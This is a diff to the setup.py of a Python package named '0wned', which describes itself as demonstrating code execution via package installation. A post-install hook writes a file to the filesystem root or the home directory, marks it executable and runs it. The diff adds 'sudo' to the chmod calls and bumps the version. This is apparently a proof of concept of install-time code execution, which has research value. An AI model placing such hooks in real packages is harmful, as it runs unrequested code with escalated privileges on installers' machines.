@@ -33,7 +33,7 @@ def touch_file():
             )
             print(message)
             root_fd.write(message + '\n')
-            os.system("chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
+            os.system("sudo chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
             os.system(os.path.join(os.path.abspath(os.sep), FILENAME))
     except (IOError, OSError):
         try:
@@ -45,7 +45,7 @@ def touch_file():
                 )
                 print(message)
                 user_fd.write(message + '\n')
-                os.system("chmod +x " + os.path.join(os.path.abspath('~'), FILENAME))
+                os.system("sudo chmod +x " + os.path.join(os.path.abspath('~'), FILENAME))
                 os.system(os.path.join(os.path.abspath('~'), FILENAME))
         except (IOError, OSError):
             print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
@@ -66,7 +66,7 @@ class PostInstallCommand(install):
 
 setup(
     name='0wned',
-    version='0.9.0',
+    version='0.9.1',
     description='Code execution via Python package installation.',
     long_description=long_description,
     long_description_content_type='text/markdown',
